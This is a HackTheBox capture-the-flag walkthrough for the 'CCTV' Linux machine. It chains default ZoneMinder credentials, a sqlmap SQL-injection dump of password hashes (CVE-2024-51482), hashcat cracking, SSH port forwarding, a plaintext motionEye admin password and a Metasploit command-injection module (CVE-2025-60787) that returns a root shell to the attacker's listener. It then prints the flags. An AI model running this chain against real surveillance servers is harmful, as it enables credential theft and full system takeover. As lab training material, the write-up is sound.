# HackTheBox: CCTV

* **Machine Name:** CCTV
* **Difficulty:** Easy
* **OS:** Linux
* **Season**: 10
---

## Reconnaissance

Scanning active ports with `nmap` reveals two open ports: SSH (22) and HTTP (80).

Bash

```
nmap -T4 -sV -sC 10.129.3.88
```

_The output shows open ports 22 (OpenSSH 9.6p1) and 80 (Apache 2.4.58). Port 80 redirects to `cctv.htb`._

Add the domain to `/etc/hosts`:

Bash

```
echo '10.129.3.88 cctv.htb' | sudo tee -a /etc/hosts
```

Directory scanning with `ffuf` yields no significant results, but browsing the site reveals a "Staff login" portal pointing to `/zm` — the default **ZoneMinder** directory.

Using the default credentials `admin:admin`, we log in successfully. The dashboard shows the application version: **v1.37.63**.

---

## Initial Foothold

ZoneMinder v1.37.63 is vulnerable to **CVE-2024-51482** (Boolean-based SQL Injection in the event tag removal function). We exploit this using `sqlmap` to dump the `zm` database and the `Users` table.

Extracting usernames and passwords (verbose output hidden):

Bash

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=8qot93jebjp68f3034cd2clpcs" -p tid -D zm -T Users -C 'Name,Username,Password' --dump
```

<img width="1239" height="262" alt="image" src="https://github.com/user-attachments/assets/60604bfb-5027-4345-8602-b644c9e51d7a" />

We retrieve 3 entries. We are interested in the user **mark** and his hash: `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`

Crack the bcrypt hash using `hashcat` and the rockyou wordlist:

Bash

```
hashcat -m 3200 hash.txt /usr/share/wordlists/passwords/rockyou.txt
```

The password for the user mark is: **opensesame**.

Connect via SSH:

Bash

```
ssh mark@cctv.htb
```

---

## Privilege Escalation

```
mark@cctv:~$ ls -la  
total 36  
drwxr-x--- 5 mark mark 4096 Mar  2 09:49 .  
drwxr-xr-x 4 root root 4096 Mar  2 09:49 ..  
lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -> /dev/null  
-rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout  
-rw-r--r-- 1 mark mark 3771 Mar 31  2024 .bashrc  
drwx------ 2 mark mark 4096 Mar  2 09:49 .cache  
drwx------ 3 mark mark 4096 Mar  2 09:49 .gnupg  
-rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile  
drwx------ 2 mark mark 4096 Mar  2 09:49 .ssh  
-rw-rw-r-- 1 mark mark  165 Sep 14 22:15 .wget-hsts
mark@cctv:~$ ls -la ../  
total 16  
drwxr-xr-x  4 root    root    4096 Mar  2 09:49 .  
drwxr-xr-x 23 root    root    4096 Mar  2 09:49 ..  
drwxr-x---  5 mark    mark    4096 Mar  2 09:49 mark  
drwxr-x---  4 sa_mark sa_mark 4096 Mar  2 09:49 sa_mark  
mark@cctv:~$ ls -la ../sa_mark  
ls: cannot open directory '../sa_mark': Permission denied

```

The user flag is currently inaccessible (lack of permissions to the `../sa_mark` directory). Checking local ports:

Bash

```
netstat -tulpn
```

We find several local services running on ports `8765`, `8888`, and `9081`. We forward these ports to our local machine:

Bash

```
ssh -L 8765:127.0.0.1:8765 -L 8888:127.0.0.1:8888 -L 9081:127.0.0.1:9081 mark@cctv.htb
```

The **motionEye** service is running at `http://127.0.0.1:8765/`. We read its configuration file on the target machine to find the admin password:

Bash

```
cat /etc/motioneye/motion.conf
```

```
# @admin_username admin  
# @normal_username user  
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0  
# @lang en  
# @enabled on  
# @normal_password    
  
  
setup_mode off  
webcontrol_port 7999  
webcontrol_interface 1  
webcontrol_localhost on  
webcontrol_parms 2  
  
camera camera-1.conf
```

We find the plaintext password: `@admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0`.

We log into the motionEye panel as `admin`. The application version (0.43.1b4) is vulnerable to Authenticated OS Command Injection (**CVE-2025-60787**).

We use Metasploit to exploit this:

Bash

```
msfconsole
use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
set RHOSTS 127.0.0.1
set RPORT 8765
set LHOST 10.10.14.103
run
```

We get a `meterpreter` session. Drop into a system shell, verify privileges, and grab both flags:

Bash

```
meterpreter > shell
id
# uid=0(root) gid=0(root) groups=0(root)

cat /home/sa_mark/user.txt && cat /root/root.txt
# 49ad3368d7cedb65b2d03e0b1bc94bf4
# 461f98866df9bb454a1f428a60aa40de
```
